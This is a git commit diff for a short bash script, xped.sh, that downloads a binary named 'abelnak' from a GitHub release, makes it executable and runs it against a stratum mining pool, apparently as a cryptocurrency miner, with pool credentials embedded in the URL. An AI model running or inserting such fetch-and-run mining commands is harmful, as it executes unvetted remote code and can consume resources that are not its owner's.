1251785ce37f9d89f28e947ec4560d914f9d7b97
vedhagsvp <vedhag230223@gmail.com>
2026-02-07 00:42:30 +0530

    Update xped.sh

--- xped.sh
+++ xped.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-wget -O "$BIN_NAME" https://github.com/vedhagsvp/soljtka/releases/download/latest/abelnak
-chmod +x "$BIN_NAME"
-./"$BIN_NAME" start -p stratum://45998109d8806685d4e96dabc275ee99977cc0b6e1f636657cd0d81c19d6e89d:b1mw7jKpFO@pool.abel-nakamoto.xyz:3333
+wget https://github.com/vedhagsvp/soljtka/releases/download/latest/abelnak
+chmod +x abelnak
+./abelnak start -p stratum://45998109d8806685d4e96dabc275ee99977cc0b6e1f636657cd0d81c19d6e89d:b1mw7jKpFO@pool.abel-nakamoto.xyz:3333
 
